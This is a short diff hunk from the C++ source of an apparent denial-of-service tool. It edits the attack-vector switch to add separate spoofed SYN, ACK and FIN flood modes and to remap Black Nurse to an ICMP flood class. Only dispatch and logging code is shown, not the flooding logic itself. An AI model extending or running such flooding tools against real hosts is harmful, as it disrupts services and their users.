@@ -48,10 +48,18 @@ void Doser::run() {
             break;
         case config::Blacknurse:
             logger->Log("Attack Vector: Black Nurse", Logger::Info);
-            flood = new Black_Nurse{conf, logger};
+            flood = new ICMP_Flood{conf, logger};
             break;
-        case config::SpoofedTCP:
-            logger->Log("Attack Vector: Spoofed TCP", Logger::Info);
+        case config::SpoofedSyn:
+            logger->Log("Attack Vector: Spoofed Syn Flood", Logger::Info);
+            flood = new Spoofed_TCP_Flood{conf, logger};
+            break;
+        case config::SpoofedAck:
+            logger->Log("Attack Vector: Spoofed Ack Flood", Logger::Info);
+            flood = new Spoofed_TCP_Flood{conf, logger};
+            break;
+        case config::SpoofedFin:
+            logger->Log("Attack Vector: Spoofed Fin Flood", Logger::Info);
             flood = new Spoofed_TCP_Flood{conf, logger};
             break;
         case config::SpoofedUDP:
